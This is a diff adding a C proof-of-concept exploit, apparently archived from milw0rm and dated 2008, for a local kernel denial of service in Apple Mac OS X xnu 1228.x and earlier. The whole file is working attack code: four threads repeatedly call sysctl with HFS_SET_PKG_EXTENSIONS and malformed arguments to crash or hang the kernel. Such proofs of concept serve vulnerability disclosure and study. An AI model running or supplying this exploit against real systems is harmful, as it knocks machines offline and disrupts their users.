@@ -1,0 +1,73 @@
+/* xnu-vfssysctl-dos.c
+ *
+ * Copyright (c) 2008 by <mu-b@digit-labs.org>
+ *
+ * Apple MACOS X xnu <= 1228.x local kernel DoS POC
+ * by mu-b - Wed 19 Nov 2008
+ *
+ * - Tested on: Apple MACOS X 10.5.5 (xnu-1228.8.20~1/RELEASE_I386)
+ *
+ *    - Private Source Code -DO NOT DISTRIBUTE -
+ * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <hfs/hfs_mount.h>
+#include <pthread.h>
+#include <string.h>
+#include <sys/mount.h>
+#include <sys/types.h>
+#include <sys/sysctl.h>
+#include <unistd.h>
+
+void
+hammer (void *arg)
+{
+  char buf[1024 * (255 + 1)];
+  int n, name[6];
+
+  memset (buf, 0, sizeof buf);
+
+  while (1)
+    {
+      name[0] = CTL_VFS;
+      name[1] = 17;
+      name[2] = HFS_SET_PKG_EXTENSIONS;
+      name[3] = (int) buf;
+      name[4] = 1024;
+      name[5] = (rand () % 254) + 1;
+      n = sysctl (name, 6, NULL, NULL, NULL, 0);
+
+      usleep(10);
+    }
+}
+
+int
+main (int argc, char **argv)
+{
+  int i, n, tid;
+
+  printf ("Apple MACOS X xnu <= 1228.x local kernel DoS PoC\n"
+          "by: <mu-b@digit-labs.org>\n"
+          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");
+
+  for (i = 0; i < 4; i++)
+    {
+      n = pthread_create (&tid, NULL, hammer, NULL);
+      if (n < 0)
+        {
+          fprintf (stderr, "failed creating hammer thread\n");
+          return (EXIT_FAILURE);
+        }
+    }
+
+  while (1)
+    sleep (1);
+
+  /* not reached! */
+  return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2009-03-23]
